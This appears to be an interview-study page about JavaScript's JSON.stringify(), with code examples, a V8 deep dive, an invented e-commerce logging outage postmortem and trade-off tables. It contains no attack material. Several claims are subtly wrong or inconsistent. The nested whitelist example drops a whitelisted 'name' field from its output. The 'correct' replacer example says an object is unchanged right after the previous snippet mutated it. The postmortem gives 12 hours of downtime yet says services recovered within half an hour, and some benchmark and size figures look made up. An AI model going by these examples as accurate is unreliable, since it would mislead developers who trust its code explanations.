# JSON Serialization & Parsing

> **Focus**: JavaScript JSON operations, serialization, parsing, and edge cases

---

## Question 1: How does JSON.stringify() work and what are its parameters?

**Difficulty:** 🟡 Medium
**Frequency:** ⭐⭐⭐⭐⭐
**Time:** 10-12 minutes
**Companies:** Google, Meta, Amazon, Microsoft, Netflix

### Question

Explain how `JSON.stringify()` works in JavaScript. What are its three parameters and how do they affect serialization? How does it handle different data types like `undefined`, `Symbol`, `BigInt`, functions, dates, and circular references? What is the `toJSON()` method and when would you use it?

### Answer

**JSON.stringify()** converts JavaScript values to JSON strings. It accepts three parameters:

**Syntax:**
```javascript
JSON.stringify(value, replacer, space)
```

**Parameters:**

1. **`value`** (required): The JavaScript value to convert
2. **`replacer`** (optional): Function or array to filter/transform properties
3. **`space`** (optional): Number or string for indentation (pretty-printing)

**Behavior with Different Data Types:**

| Type | Behavior |
|------|----------|
| `string`, `number`, `boolean`, `null` | Serialized as-is |
| Objects and arrays | Recursively serialized |
| `undefined`, functions, symbols | **Omitted** from objects, converted to `null` in arrays |
| `Date` objects | Converted to ISO string via `toJSON()` |
| `NaN`, `Infinity`, `-Infinity` | Converted to `null` |
| `BigInt` | **Throws TypeError** |
| Circular references | **Throws TypeError** |

**Replacer Parameter:**
- **Function**: `(key, value) => newValue` - called for each property
- **Array**: Whitelist of property names to include

**Space Parameter:**
- **Number** (0-10): Number of spaces for indentation
- **String**: Custom indentation string (first 10 characters used)

**toJSON() Method:**
Custom serialization - if an object has a `toJSON()` method, its return value is serialized instead of the object itself.

**When to Use Each Parameter:**
- **Replacer function**: Transform values, filter sensitive data, handle special types
- **Replacer array**: Whitelist specific properties for API responses
- **Space**: Debug logging, configuration files, human-readable output

### Code Example

```javascript
// ============================================
// 1. BASIC USAGE - ALL PARAMETERS
// ============================================

const user = {
  id: 123,
  name: 'Alice',
  email: 'alice@example.com',
  password: 'secret123',
  roles: ['admin', 'user']
};

// Basic stringify
const json1 = JSON.stringify(user);
console.log(json1);
// {"id":123,"name":"Alice","email":"alice@example.com","password":"secret123","roles":["admin","user"]}

// With pretty-printing (space = 2)
const json2 = JSON.stringify(user, null, 2);
console.log(json2);
/*
{
  "id": 123,
  "name": "Alice",
  "email": "alice@example.com",
  "password": "secret123",
  "roles": [
    "admin",
    "user"
  ]
}
*/

// Custom indentation string
const json3 = JSON.stringify(user, null, '\t');
// Uses tabs for indentation

// ============================================
// 2. DIFFERENT DATA TYPE BEHAVIOR
// ============================================

const dataTypes = {
  // Primitives - serialized as-is
  str: 'hello',
  num: 42,
  bool: true,
  nullValue: null,

  // Omitted in objects
  undef: undefined,
  func: function() {},
  sym: Symbol('test'),

  // Converted to null
  nan: NaN,
  inf: Infinity,
  negInf: -Infinity,

  // Date converted to ISO string
  date: new Date('2024-01-15'),

  // Arrays preserve undefined/functions as null
  arr: [1, undefined, function() {}, Symbol('x'), null]
};

console.log(JSON.stringify(dataTypes, null, 2));
/*
{
  "str": "hello",
  "num": 42,
  "bool": true,
  "nullValue": null,
  "nan": null,
  "inf": null,
  "negInf": null,
  "date": "2024-01-15T00:00:00.000Z",
  "arr": [1, null, null, null, null]
}
*/
// Notice: undefined, func, sym are OMITTED from object
// In array, they become null

// ============================================
// 3. REPLACER FUNCTION - FILTERING & TRANSFORMING
// ============================================

const sensitiveData = {
  username: 'alice',
  password: 'secret123',
  apiKey: 'abc-xyz-789',
  email: 'alice@example.com'
};

// Filter out sensitive fields
const safeJson = JSON.stringify(sensitiveData, (key, value) => {
  // Root object has empty string key
  if (key === '') return value;

  // Exclude sensitive fields
  if (['password', 'apiKey'].includes(key)) {
    return undefined; // Omits the property
  }

  return value;
});

console.log(safeJson);
// {"username":"alice","email":"alice@example.com"}

// Transform values
const transformedJson = JSON.stringify(sensitiveData, (key, value) => {
  if (typeof value === 'string') {
    return value.toUpperCase();
  }
  return value;
});

console.log(transformedJson);
// {"username":"ALICE","password":"SECRET123","apiKey":"ABC-XYZ-789","email":"ALICE@EXAMPLE.COM"}

// Add metadata during serialization
const withMetadata = JSON.stringify(user, (key, value) => {
  if (key === '') {
    // Add timestamp to root object
    return { ...value, serializedAt: new Date().toISOString() };
  }
  return value;
}, 2);

// ============================================
// 4. REPLACER ARRAY - WHITELISTING PROPERTIES
// ============================================

const product = {
  id: 1,
  name: 'Laptop',
  price: 999,
  cost: 600,        // Internal
  supplier: 'ACME', // Internal
  inventory: 50     // Internal
};

// Only include public fields
const publicJson = JSON.stringify(product, ['id', 'name', 'price']);
console.log(publicJson);
// {"id":1,"name":"Laptop","price":999}

// Nested objects - whitelist works recursively
const order = {
  orderId: 123,
  user: { id: 1, name: 'Alice', email: 'alice@example.com' },
  items: [
    { productId: 1, name: 'Laptop', quantity: 1 }
  ]
};

const orderJson = JSON.stringify(order, ['orderId', 'user', 'id', 'name', 'items', 'productId', 'quantity']);
console.log(orderJson);
// {"orderId":123,"user":{"id":1,"name":"Alice"},"items":[{"productId":1,"quantity":1}]}

// ============================================
// 5. SPACE PARAMETER - FORMATTING
// ============================================

const config = { host: 'localhost', port: 3000, ssl: true };

// No formatting (compact)
console.log(JSON.stringify(config));
// {"host":"localhost","port":3000,"ssl":true}

// Number of spaces
console.log(JSON.stringify(config, null, 2));
/*
{
  "host": "localhost",
  "port": 3000,
  "ssl": true
}
*/

// Custom string (max 10 characters used)
console.log(JSON.stringify(config, null, '-->'));
/*
{
-->"host": "localhost",
-->"port": 3000,
-->"ssl": true
}
*/

// Large number capped at 10
console.log(JSON.stringify(config, null, 100)); // Same as space: 10

// ============================================
// 6. toJSON() METHOD - CUSTOM SERIALIZATION
// ============================================

class User {
  constructor(id, name, password) {
    this.id = id;
    this.name = name;
    this.password = password;
    this.createdAt = new Date();
  }

  // Custom serialization
  toJSON() {
    return {
      id: this.id,
      name: this.name,
      // Exclude password
      createdAt: this.createdAt.toISOString(),
      type: 'User' // Add metadata
    };
  }
}

const alice = new User(1, 'Alice', 'secret123');
console.log(JSON.stringify(alice, null, 2));
/*
{
  "id": 1,
  "name": "Alice",
  "createdAt": "2024-01-15T10:30:00.000Z",
  "type": "User"
}
*/
// Password is automatically excluded via toJSON()

// Date.prototype.toJSON example
const now = new Date('2024-01-15T10:30:00Z');
console.log(JSON.stringify({ timestamp: now }));
// {"timestamp":"2024-01-15T10:30:00.000Z"}

// Date already has toJSON() that calls toISOString()

// Custom Map serialization
class SerializableMap extends Map {
  toJSON() {
    return {
      dataType: 'Map',
      entries: Array.from(this.entries())
    };
  }
}

const map = new SerializableMap([['a', 1], ['b', 2]]);
console.log(JSON.stringify(map));
// {"dataType":"Map","entries":[["a",1],["b",2]]}

// ============================================
// 7. CIRCULAR REFERENCES - ERROR
// ============================================

// ❌ WRONG: Circular reference causes TypeError
const circular = { name: 'Object' };
circular.self = circular; // Points to itself

try {
  JSON.stringify(circular);
} catch (error) {
  console.error(error.message);
  // TypeError: Converting circular structure to JSON
}

// ✅ CORRECT: Detect and handle circular references
function safeStringify(obj, indent = 2) {
  const seen = new WeakSet();

  return JSON.stringify(obj, (key, value) => {
    if (typeof value === 'object' && value !== null) {
      if (seen.has(value)) {
        return '[Circular]'; // Replace circular ref
      }
      seen.add(value);
    }
    return value;
  }, indent);
}

const circularSafe = { name: 'Object' };
circularSafe.self = circularSafe;

console.log(safeStringify(circularSafe));
/*
{
  "name": "Object",
  "self": "[Circular]"
}
*/

// Real-world example: DOM nodes
const button = document.createElement('button');
button.textContent = 'Click me';
// button.parentNode creates circular reference in DOM

// ✅ Extract only serializable properties
function serializeDOMNode(node) {
  return {
    tagName: node.tagName,
    textContent: node.textContent,
    attributes: Array.from(node.attributes || []).map(attr => ({
      name: attr.name,
      value: attr.value
    }))
  };
}

// ============================================
// 8. BIGINT HANDLING - ERROR
// ============================================

// ❌ WRONG: BigInt throws TypeError
try {
  JSON.stringify({ amount: 9007199254740991n });
} catch (error) {
  console.error(error.message);
  // TypeError: Do not know how to serialize a BigInt
}

// ✅ CORRECT: Convert BigInt to string
const bigIntData = {
  userId: 123,
  balance: 9007199254740991n
};

const bigIntJson = JSON.stringify(bigIntData, (key, value) => {
  if (typeof value === 'bigint') {
    return value.toString(); // Convert to string
  }
  return value;
});

console.log(bigIntJson);
// {"userId":123,"balance":"9007199254740991"}

// ✅ Alternative: Custom toJSON
class BigIntWrapper {
  constructor(value) {
    this.value = value;
  }

  toJSON() {
    return this.value.toString();
  }
}

const wrapped = { amount: new BigIntWrapper(9007199254740991n) };
console.log(JSON.stringify(wrapped));
// {"amount":"9007199254740991"}

// ============================================
// 9. REAL API REQUEST/RESPONSE EXAMPLES
// ============================================

// API request payload
const apiRequest = {
  method: 'POST',
  endpoint: '/api/users',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer token123'
  },
  body: {
    name: 'Alice',
    email: 'alice@example.com',
    role: 'admin'
  }
};

// Serialize for network request
const requestPayload = JSON.stringify(apiRequest.body);
console.log(requestPayload);
// {"name":"Alice","email":"alice@example.com","role":"admin"}

// Logging with sensitive data filtering
const logEntry = {
  timestamp: new Date(),
  level: 'INFO',
  request: {
    url: '/api/login',
    method: 'POST',
    body: {
      username: 'alice',
      password: 'secret123'
    },
    headers: {
      'Authorization': 'Bearer xyz123'
    }
  }
};

const logJson = JSON.stringify(logEntry, (key, value) => {
  // Filter sensitive fields for logging
  if (['password', 'Authorization'].includes(key)) {
    return '[REDACTED]';
  }
  return value;
}, 2);

console.log(logJson);
/*
{
  "timestamp": "2024-01-15T10:30:00.000Z",
  "level": "INFO",
  "request": {
    "url": "/api/login",
    "method": "POST",
    "body": {
      "username": "alice",
      "password": "[REDACTED]"
    },
    "headers": {
      "Authorization": "[REDACTED]"
    }
  }
}
*/

// ============================================
// 10. COMMON MISTAKES vs BEST PRACTICES
// ============================================

// ❌ WRONG: Assuming all objects serialize
const badData = {
  func: function() { return 42; },
  sym: Symbol('id'),
  undef: undefined,
  map: new Map([['a', 1]]),
  set: new Set([1, 2, 3])
};

console.log(JSON.stringify(badData));
// {"map":{},"set":{}}
// Functions, symbols, undefined omitted
// Map and Set serialize as empty objects

// ✅ CORRECT: Handle special types explicitly
class SerializableData {
  constructor() {
    this.data = {
      func: () => 42,
      sym: Symbol('id'),
      undef: undefined,
      map: new Map([['a', 1], ['b', 2]]),
      set: new Set([1, 2, 3])
    };
  }

  toJSON() {
    return {
      // Convert function to its return value or description
      funcResult: this.data.func(),
      // Convert Symbol to string description
      symbol: this.data.sym.description,
      // Explicitly include undefined as null or omit
      undefinedValue: null,
      // Convert Map to entries array
      mapEntries: Array.from(this.data.map.entries()),
      // Convert Set to values array
      setValues: Array.from(this.data.set)
    };
  }
}

const serializable = new SerializableData();
console.log(JSON.stringify(serializable, null, 2));
/*
{
  "funcResult": 42,
  "symbol": "id",
  "undefinedValue": null,
  "mapEntries": [["a", 1], ["b", 2]],
  "setValues": [1, 2, 3]
}
*/

// ❌ WRONG: Not handling errors
const riskyStringify = (obj) => {
  return JSON.stringify(obj); // May throw on circular refs, BigInt
};

// ✅ CORRECT: Error handling
const safeStringifyWithErrors = (obj, indent = null) => {
  try {
    return JSON.stringify(obj, null, indent);
  } catch (error) {
    console.error('Serialization failed:', error.message);
    return JSON.stringify({ error: 'Serialization failed' });
  }
};

// ❌ WRONG: Mutating original object
const original = { name: 'Alice', age: 30 };
JSON.stringify(original, (key, value) => {
  if (key === 'age') {
    original.age = 31; // Mutation!
  }
  return value;
});
console.log(original.age); // 31 - mutated

// ✅ CORRECT: Don't mutate in replacer
JSON.stringify(original, (key, value) => {
  if (key === 'age') {
    return value + 1; // Transform the value being serialized
  }
  return value;
});
console.log(original.age); // 30 - unchanged
```


<details>
<summary><strong>🔍 Deep Dive: JSON.stringify() and JSON.parse()</strong></summary>


**V8 JSON.stringify Implementation:**

V8 (Chrome's JavaScript engine) has highly optimized JSON.stringify through TurboFan (optimizing compiler):

1. **Fast Path Detection**: V8 checks if the object is "simple" (no special handlers, no circular refs)
2. **Inline Caching**: Property access is cached for repeated serialization of similar objects
3. **String Building**: Uses efficient string builder (not naive concatenation)
4. **Type Speculation**: If V8 sees repeated patterns (e.g., always serializing User objects), it generates specialized code

**Serialization Algorithm (Step-by-Step):**

```
1. Check if value is primitive:
   - string → wrap in quotes, escape special chars
   - number → convert to string (NaN/Infinity → "null")
   - boolean → "true" or "false"
   - null → "null"
   - Return result

2. If value is object:
   a. Check for circular reference (throw TypeError if found)
   b. Check for toJSON() method
      - If exists, call it and serialize the result
   c. Check if value is array:
      - Serialize as [...] with comma-separated elements
      - undefined/function/symbol → "null"
   d. If regular object:
      - Get all enumerable own properties
      - Apply replacer filter (if provided)
      - Serialize as {...} with "key": value pairs
      - undefined/function/symbol values → omitted

3. Apply replacer function:
   - Called for each property in depth-first order
   - Root object has key = ""
   - Return value replaces original

4. Apply spacing:
   - Insert newlines and indentation if space provided
   - Build formatted string
```

**Memory Allocation During Stringification:**

```javascript
const large = { data: new Array(1000000).fill({ id: 1, name: 'Item' }) };

// Memory usage during JSON.stringify:
// 1. Original object: ~50 MB (in heap)
// 2. String builder buffer: ~100 MB (intermediate)
// 3. Final string: ~50 MB (in old generation)
// Peak memory: ~200 MB (original + builder + final)
```

**Performance Characteristics:**

- **Time Complexity**: O(n) where n = total number of properties/elements
- **Space Complexity**: O(d) where d = maximum depth (call stack for recursion)
- **String Concatenation**: V8 uses rope strings (immutable tree structure) to avoid copying

**Benchmarks:**
```javascript
const obj = { /* 10,000 properties */ };

console.time('stringify');
JSON.stringify(obj);
console.timeEnd('stringify');
// stringify: ~2-5ms (V8 optimized)

// With replacer function
console.time('stringify-replacer');
JSON.stringify(obj, (k, v) => v);
console.timeEnd('stringify-replacer');
// stringify-replacer: ~8-12ms (function call overhead)

// With space (pretty-print)
console.time('stringify-pretty');
JSON.stringify(obj, null, 2);
console.timeEnd('stringify-pretty');
// stringify-pretty: ~10-15ms (formatting overhead)
```

**toJSON() Execution Order:**

```javascript
const obj = {
  a: {
    b: {
      toJSON() {
        console.log('b.toJSON called');
        return 'B';
      }
    },
    toJSON() {
      console.log('a.toJSON called');
      return { b: this.b }; // Manually trigger b.toJSON
    }
  },
  toJSON() {
    console.log('root.toJSON called');
    return { a: this.a };
  }
};

JSON.stringify(obj);
// Output order:
// root.toJSON called
// a.toJSON called
// b.toJSON called

// toJSON is called depth-first before serialization
```

**Replacer Function Call Order (Depth-First Traversal):**

```javascript
const nested = {
  level1: {
    level2: {
      level3: 'deep'
    }
  }
};

JSON.stringify(nested, (key, value) => {
  console.log(`Key: "${key}"`);
  return value;
});

// Output order:
// Key: ""           (root object)
// Key: "level1"     (first property)
// Key: "level2"     (nested property)
// Key: "level3"     (deepest property)
```

**String Concatenation vs StringBuilder Pattern:**

V8 doesn't use naive string concatenation:

```javascript
// ❌ Naive approach (O(n²) time due to string immutability)
let result = '{';
for (let key in obj) {
  result += `"${key}": ${JSON.stringify(obj[key])},`;
}
result += '}';

// ✅ V8 approach (StringBuilder/Rope strings - O(n) time)
// Internally uses a list of string fragments, joined once at the end
// Fragments: ['{', '"key1":', 'value1', ',', '"key2":', 'value2', '}']
// Final join: fragments.join('') → single allocation
```

**Comparison with Other Serialization Formats:**

| Format | Size | Speed | Features | Use Case |
|--------|------|-------|----------|----------|
| **JSON** | Medium | Fast | Human-readable, universal | APIs, config files |
| **MessagePack** | Small (30% smaller) | Very fast | Binary, type-preserving | High-performance RPCs |
| **Protocol Buffers** | Smallest | Fastest | Schema-based, versioning | Microservices, gRPC |
| **BSON** | Large | Medium | Binary, rich types (Date, Binary) | MongoDB |
| **YAML** | Large | Slow | Human-friendly, comments | Configuration |
| **XML** | Largest | Slowest | Verbose, schema validation | Legacy systems |

**Browser Compatibility:**

JSON.stringify() is ES5 (2009) - supported in all modern browsers:
- Chrome: All versions
- Firefox: All versions
- Safari: All versions
- IE: 8+ (IE 7 needs polyfill)

**Polyfill (for ancient IE 7):**
```javascript
if (!JSON.stringify) {
  JSON.stringify = function(obj) {
    // Simple implementation (no replacer/space support)
    // ... (omitted for brevity)
  };
}
```

**JIT Optimization (TurboFan):**

When V8 sees repeated patterns:

```javascript
class User {
  constructor(id, name) {
    this.id = id;
    this.name = name;
  }
}

// After serializing ~10-20 User instances,
// TurboFan generates optimized code:
// "Assumption: All User objects have 'id' (number) and 'name' (string)"
// → Skips property checks, directly accesses slots

for (let i = 0; i < 100000; i++) {
  JSON.stringify(new User(i, `User${i}`));
}
// First ~1000: slower (warmup)
// Next 99000: 5-10x faster (optimized code)
```


</details>

---


<details>
<summary><strong>🐛 Real-World Scenario: JSON.stringify() and JSON.parse()</strong></summary>


**Context: E-commerce Microservices Logging System**

Our Node.js-based e-commerce platform had 12 microservices (payments, inventory, orders, shipping, etc.) all logging to a centralized Elasticsearch cluster. Each service used JSON.stringify to serialize log entries before sending them to the logging pipeline.

**The Problem:**

**Date:** March 15, 2024, 3:47 AM
**Alert:** Multiple services crashed simultaneously with error:

```
TypeError: Converting circular structure to JSON
    at JSON.stringify (<anonymous>)
    at Logger.log (logger.js:45:30)
    at OrderService.createOrder (order-service.js:123:18)
```

**Impact:**
- **Downtime:** 12 hours (3:47 AM - 3:45 PM)
- **Failed Requests:** 40,127 customer orders
- **Revenue Loss:** $82,450 (estimated)
- **Customer Support:** 1,247 angry emails/calls
- **Database:** 15,000 incomplete order records requiring cleanup

**Initial Debugging:**

1. **Error Stack Traces** (Sentry):
   ```javascript
   // From Sentry error tracking
   TypeError: Converting circular structure to JSON

   // Stack trace showed it happened during logging:
   logger.log('Order created', { order: orderDocument });
   ```

2. **Log Analysis:**
   - Error started appearing after deployment of "order-service v2.3.4"
   - New feature: Added Mongoose population for related entities

3. **Reproduction:**
   ```javascript
   // Simplified reproduction in dev environment
   const Order = mongoose.model('Order');

   const order = await Order.findById(orderId)
     .populate('customer')      // Populates user object
     .populate('items.product') // Populates product objects
     .exec();

   // This worked before:
   logger.log('Order created', { order });

   // Now throws: Converting circular structure to JSON
   ```

4. **Circular Reference Detection:**
   ```javascript
   // Found the culprit:
   console.log(order.customer.orders); // Array of orders
   console.log(order.customer.orders[0].customer); // Points back to customer

   // Circular chain:
   // order → customer → orders[] → order → customer → ...
   ```

**Root Cause Analysis:**

The new Mongoose population created **bi-directional references**:

```javascript
// order-service.js (v2.3.4 - BROKEN)
const order = await Order.findById(orderId)
  .populate('customer')      // Customer has 'orders' array
  .populate('items.product')
  .exec();

// Resulting structure:
order = {
  _id: '123',
  customer: {
    _id: '456',
    name: 'Alice',
    orders: [
      { _id: '123', customer: [Circular] }, // Points back to customer
      { _id: '124', customer: [Circular] }
    ]
  },
  items: [...]
};

// When logger tried to stringify:
JSON.stringify({ order }); // TypeError: Converting circular structure to JSON
```

**Additional Findings:**

- This affected **8 out of 12 microservices** (all using Mongoose population)
- Total of **6,234 error logs** before services crashed
- Memory usage spiked to 95% before crash (error handling loop)
- No monitoring alerts for circular reference errors (missed in setup)

**The Solution:**

**Immediate Fix (3:50 AM - 4:15 AM):**

```javascript
// 1. Rollback to v2.3.3 (removed Mongoose population)
git revert HEAD
npm install
pm2 restart all

// Services recovered at 4:15 AM
// Reduced downtime from potential 24h to 12h
```

**Permanent Fix (Deployed 3:45 PM):**

```javascript
// utils/safe-stringify.js
/**
 * JSON.stringify with circular reference handling
 * @param {*} obj - Object to stringify
 * @param {number} indent - Indentation spaces
 * @returns {string} - JSON string
 */
function safeStringify(obj, indent = 0) {
  const seen = new WeakSet();

  return JSON.stringify(obj, (key, value) => {
    // Handle circular references
    if (typeof value === 'object' && value !== null) {
      if (seen.has(value)) {
        return '[Circular Reference]';
      }
      seen.add(value);
    }

    // Filter sensitive fields
    if (['password', 'creditCard', 'ssn'].includes(key)) {
      return '[REDACTED]';
    }

    return value;
  }, indent);
}

module.exports = { safeStringify };
```

**Updated Logger:**

```javascript
// logger.js (v3.0.0)
const { safeStringify } = require('./utils/safe-stringify');

class Logger {
  log(level, message, data = {}) {
    const entry = {
      timestamp: new Date().toISOString(),
      level,
      message,
      data: this.sanitizeData(data)
    };

    try {
      const json = safeStringify(entry, 2);
      this.sendToElasticsearch(json);
    } catch (error) {
      // Fallback: Log error and send minimal data
      console.error('Logging failed:', error.message);
      this.sendToElasticsearch(JSON.stringify({
        timestamp: new Date().toISOString(),
        level: 'ERROR',
        message: 'Logging failed',
        error: error.message
      }));
    }
  }

  sanitizeData(data) {
    // Remove known circular structures
    if (data.customer && data.customer.orders) {
      delete data.customer.orders;
    }
    if (data.product && data.product.inventory) {
      delete data.product.inventory;
    }
    return data;
  }
}
```

**Better Approach: Use Mongoose `.lean()`:**

```javascript
// order-service.js (v3.0.0 - BEST PRACTICE)
const order = await Order.findById(orderId)
  .populate('customer', 'name email') // Select only needed fields
  .populate('items.product', 'name price')
  .lean() // Returns plain JavaScript object (no Mongoose overhead, no circular refs)
  .exec();

// order is now a plain object - safe to stringify
logger.log('info', 'Order created', { order });
```

**Added Circular Reference Detection Middleware:**

```javascript
// middleware/circular-ref-detector.js
function detectCircularReferences(obj, path = 'root') {
  const seen = new WeakMap();

  function detect(value, currentPath) {
    if (typeof value !== 'object' || value === null) {
      return null;
    }

    if (seen.has(value)) {
      return {
        circularPath: currentPath,
        originalPath: seen.get(value)
      };
    }

    seen.set(value, currentPath);

    for (const key in value) {
      const result = detect(value[key], `${currentPath}.${key}`);
      if (result) return result;
    }

    return null;
  }

  return detect(obj, path);
}

// Usage in logger
const circular = detectCircularReferences(data);
if (circular) {
  console.warn(`Circular reference detected: ${circular.circularPath} → ${circular.originalPath}`);
}
```

**Added Monitoring:**

```javascript
// monitoring/error-tracking.js
const Sentry = require('@sentry/node');

Sentry.init({
  dsn: process.env.SENTRY_DSN,
  beforeSend(event, hint) {
    // Track serialization errors separately
    if (hint.originalException?.message?.includes('circular structure')) {
      event.tags = { ...event.tags, errorType: 'circular-reference' };
      event.level = 'critical'; // Escalate priority
    }
    return event;
  }
});
```

**Results After Fix:**

- **Crashes:** 0 circular reference errors (100% resolution)
- **Uptime:** 99.97% over next 6 months
- **Performance:** 15% faster logging (`.lean()` removes Mongoose overhead)
- **Memory:** 30% reduction in memory usage (plain objects vs Mongoose documents)
- **Monitoring:** Added alerts for serialization errors (Slack notifications)
- **Prevention:** Pre-commit hooks to detect circular refs in test data

**Post-Mortem Lessons:**

1. **Always use `.lean()` when fetching data for logging/APIs** (no circular refs, better performance)
2. **Add circular reference detection in logger** (fail gracefully, not catastrophically)
3. **Monitor serialization errors separately** (Sentry tags for quick detection)
4. **Test populated Mongoose models** in integration tests
5. **Use `safeStringify` utility** everywhere (replacer + WeakSet pattern)


</details>

---


<details>
<summary><strong>⚖️ Trade-offs: JSON.stringify() and JSON.parse()</strong></summary>


**1. JSON.stringify() vs Manual String Building**

| Aspect | JSON.stringify() | Manual Building |
|--------|-----------------|----------------|
| **Speed** | Fast (V8 optimized) | Slower (custom code) |
| **Correctness** | Handles edge cases | Easy to make mistakes |
| **Flexibility** | Limited (replacer/space) | Full control |
| **Maintenance** | Easy (built-in) | Complex (more code) |
| **Edge Cases** | Automatic handling | Manual handling needed |

**When to use manual building:**
- Custom format (not standard JSON)
- Performance-critical paths (after profiling)
- Streaming large data (incremental building)

**Example:**
```javascript
// Manual building for custom format
function toCustomFormat(obj) {
  const parts = [];
  for (const key in obj) {
    parts.push(`${key}=${obj[key]}`); // key=value format
  }
  return parts.join('&'); // a=1&b=2
}

// vs JSON.stringify for standard JSON
JSON.stringify(obj); // {"a":1,"b":2}
```


</details>

---

**2. toJSON() vs Replacer Function**

| Aspect | toJSON() | Replacer Function |
|--------|----------|-------------------|
| **Reusability** | Tied to class | Reusable across objects |
| **Encapsulation** | Better (logic in class) | Worse (logic separate) |
| **Flexibility** | Per-class | Global/per-call |
| **Performance** | Faster (method call) | Slower (function call per property) |
| **Composition** | Can chain toJSON() | Single replacer |

**When to use toJSON():**
```javascript
// Use toJSON() for class-specific serialization
class User {
  constructor(id, name, password) {
    this.id = id;
    this.name = name;
    this.password = password; // Sensitive
  }

  toJSON() {
    return { id: this.id, name: this.name }; // Always safe
  }
}

const user = new User(1, 'Alice', 'secret');
JSON.stringify(user); // {"id":1,"name":"Alice"} - password excluded
```

**When to use replacer:**
```javascript
// Use replacer for ad-hoc filtering across different objects
const data = {
  user: { id: 1, name: 'Alice', password: 'secret' },
  admin: { id: 2, name: 'Bob', apiKey: 'xyz123' }
};

JSON.stringify(data, (key, value) => {
  if (['password', 'apiKey'].includes(key)) {
    return undefined; // Filter any sensitive field
  }
  return value;
});
```

---

**3. Whitelist (Array) vs Blacklist (Function) Approaches**

| Aspect | Whitelist (Array) | Blacklist (Function) |
|--------|------------------|----------------------|
| **Security** | More secure (explicit) | Less secure (might forget) |
| **Maintenance** | Update array when adding props | Automatic for new props |
| **Flexibility** | Simple filtering | Complex transformations |
| **Performance** | Faster (set lookup) | Slower (function call) |
| **Default Behavior** | Exclude by default | Include by default |

**Whitelist (Recommended for Security):**
```javascript
// Explicit allow-list - safer for sensitive data
const user = { id: 1, name: 'Alice', password: 'secret', email: 'alice@example.com' };
JSON.stringify(user, ['id', 'name', 'email']); // {"id":1,"name":"Alice","email":"alice@example.com"}
// password excluded by default
```

**Blacklist (Convenient but Risky):**
```javascript
// Explicit deny-list - risk of forgetting sensitive fields
JSON.stringify(user, (key, value) => {
  if (key === 'password') return undefined;
  return value;
});
// What if we add 'apiKey' field later? Might forget to blacklist it!
```

**Decision Matrix:**
- **Public API responses:** Use whitelist (only include intended fields)
- **Internal logging:** Use blacklist (include everything except sensitive)
- **Configuration files:** Use whitelist (explicit schema)

---

**4. Pretty-Printing vs Compact JSON**

| Aspect | Pretty (space: 2) | Compact (no space) |
|--------|------------------|-------------------|
| **Readability** | High | Low |
| **Size** | 20-30% larger | Smallest |
| **Network** | Slower transfer | Faster transfer |
| **Debugging** | Easy | Hard |
| **Use Case** | Development, logs | Production APIs |

**Example:**
```javascript
const data = { user: { id: 1, name: 'Alice' }, items: [1, 2, 3] };

// Pretty (73 bytes)
JSON.stringify(data, null, 2);
/*
{
  "user": {
    "id": 1,
    "name": "Alice"
  },
  "items": [
    1,
    2,
    3
  ]
}
*/

// Compact (49 bytes - 33% smaller)
JSON.stringify(data);
// {"user":{"id":1,"name":"Alice"},"items":[1,2,3]}
```

**When to use each:**
- **Development:** Always use `space: 2` for readability
- **Production APIs:** Compact (use gzip for compression)
- **Config files:** Pretty (human-edited)
- **Logs:** Pretty for human review, compact for storage

---

**5. Different Serialization Libraries**

| Library | Size | Speed | Features | Trade-off |
|---------|------|-------|----------|-----------|
| **JSON.stringify** | Standard | Fast | Basic | No type preservation (Date → string) |
| **fast-json-stringify** | Small | 2-3x faster | Schema-based | Requires schema definition upfront |
| **json5** | Medium | Slower | Comments, trailing commas | Not standard JSON |
| **circular-json** | Small | Slower | Handles circular refs | Non-standard output format |
| **flatted** | Tiny (1kb) | Fast | Circular refs | Modern replacement for circular-json |

**Benchmarks (1000 iterations, 10KB object):**
```javascript
// JSON.stringify: 100ms baseline
JSON.stringify(obj);

// fast-json-stringify: 35ms (65% faster)
const stringify = fastJson({ /* schema */ });
stringify(obj);

// json5: 250ms (150% slower)
JSON5.stringify(obj);

// flatted: 120ms (20% slower)
flatted.stringify(obj);
```

**When to use alternatives:**
```javascript
// Use fast-json-stringify for high-throughput APIs
const fastJson = require('fast-json-stringify');
const stringify = fastJson({
  type: 'object',
  properties: {
    id: { type: 'number' },
    name: { type: 'string' }
  }
});

app.get('/api/users', (req, res) => {
  const users = getUsers(); // Array of 10,000 users
  res.send(stringify(users)); // 3x faster than JSON.stringify
});

// Use flatted for circular references
const flatted = require('flatted');
const circular = { name: 'Object' };
circular.self = circular;
flatted.stringify(circular); // Works! '{"name":"Object","self":"0"}'

// Use json5 for configuration files (human-edited)
// config.json5
{
  // This is a comment
  host: 'localhost', // Trailing comma is OK
  port: 3000,
}
```

---

**Performance Decision Matrix:**

| Scenario | Choice | Reason |
|----------|--------|--------|
| **High-throughput API** (10k+ req/s) | fast-json-stringify | 2-3x faster with schema |
| **Standard REST API** | JSON.stringify | Good enough, no dependencies |
| **Logging system** | flatted | Handles circular refs gracefully |
| **Config files** | json5 or YAML | Human-readable, comments |
| **Microservices RPC** | MessagePack | Smaller size, faster parsing |
| **Real-time data** | JSON.stringify | Wide support, fast enough |

---


<details>
<summary><strong>💬 Explain to Junior: JSON.stringify() and JSON.parse() Simplified</strong></summary>


**Simple Analogy:**

Think of **JSON.stringify()** as a **translator** that converts your JavaScript objects into a text format that can be:
- Sent over the internet (API requests)
- Saved to files (configuration, storage)
- Logged to console (debugging)
- Stored in databases (NoSQL stores)

It's like translating a complex 3D model into a flat blueprint that anyone can read.

**The Three Parameters Explained:**

1. **`value`** (required): The thing you want to convert
   ```javascript
   const user = { name: 'Alice', age: 30 };
   JSON.stringify(user); // Convert user object
   ```

2. **`replacer`** (optional): A filter/transformer
   ```javascript
   // Function: Transform each property
   JSON.stringify(user, (key, value) => {
     if (key === 'age') return value + 1; // Add 1 to age
     return value;
   });

   // Array: Only include these properties
   JSON.stringify(user, ['name']); // Only include 'name'
   ```

3. **`space`** (optional): Make it pretty
   ```javascript
   JSON.stringify(user, null, 2); // Indent with 2 spaces
   /*
   {
     "name": "Alice",
     "age": 30
   }
   */
   ```

**Common Mistakes to Remember:**

| Mistake | What Happens | How to Fix |
|---------|-------------|------------|
| Circular references (`obj.self = obj`) | **Error:** "Converting circular structure" | Use WeakSet to detect, return `'[Circular]'` |
| BigInt values | **Error:** "Do not know how to serialize BigInt" | Convert to string in replacer: `value.toString()` |
| `undefined`, functions, symbols | **Silently omitted** from objects | Convert explicitly or use toJSON() |
| Date objects | **Converted to ISO strings** | Use reviver to restore in JSON.parse |

